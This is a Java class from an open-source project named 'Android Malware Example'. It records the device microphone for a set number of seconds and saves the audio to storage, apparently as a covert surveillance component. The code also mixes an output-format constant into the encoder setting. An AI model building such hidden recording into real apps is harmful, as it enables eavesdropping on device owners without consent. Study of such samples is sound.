/*
 * Copyright (c) 2016. Darryl Burke - Burke Consulting
 *
 * This file is part of Android Malware Example.
 *
 *     Android Malware Example is free software: you can redistribute it and/or modify
 *     it under the terms of the GNU General Public License as published by
 *     the Free Software Foundation, either version 3 of the License, or
 *     (at your option) any later version.
 *
 *     Android Malware Example is distributed in the hope that it will be useful,
 *     but WITHOUT ANY WARRANTY; without even the implied warranty of
 *     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *     GNU General Public License for more details.
 *
 *     You should have received a copy of the GNU General Public License
 *     along with Android Malware Example.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

package com.burke_consulting.malwareexample;

import android.content.Context;
import android.media.MediaRecorder;
import android.os.Environment;
import android.util.Log;

import java.io.File;

/**
 * Created by darrylb on 10/2/16.
 */
public class GetAudio {
    Context context;
    ConfigParams configParams;
    MediaRecorder myAudioRecorder;

    public GetAudio(Context _context) {
        context = _context;
        configParams = new ConfigParams(context);

    }
    public void RecordAudio (int seconds, String file){

        File fpath = configParams.StoragePath;
        Log.d(configParams.PROGID,"Recording Audio to:"+fpath+"/"+file);

        try {


            myAudioRecorder = new MediaRecorder();
            myAudioRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            myAudioRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            myAudioRecorder.setAudioEncoder(MediaRecorder.OutputFormat.AMR_NB);
            myAudioRecorder.setOutputFile(fpath + "/" + file);
            myAudioRecorder.prepare();
            if (configParams.Logging) Log.d(configParams.PROGID,"GetAudio: recording started");
            myAudioRecorder.start();

            Thread.sleep(seconds*1000);

            myAudioRecorder.stop();
            if (configParams.Logging)Log.d(configParams.PROGID,"GetAudio: recording finished");
            myAudioRecorder.release();
            myAudioRecorder = null;
        } catch (Exception ex){
            if (configParams.Logging) Log.d(configParams.PROGID,"GetAudio: record error:"+ex.toString());
        }

    }
    public File getRecordingFile(String file){

        File fpath = Environment.getExternalStorageDirectory();
        File recording = new File(fpath+"/"+file);
        return recording;

    }
}
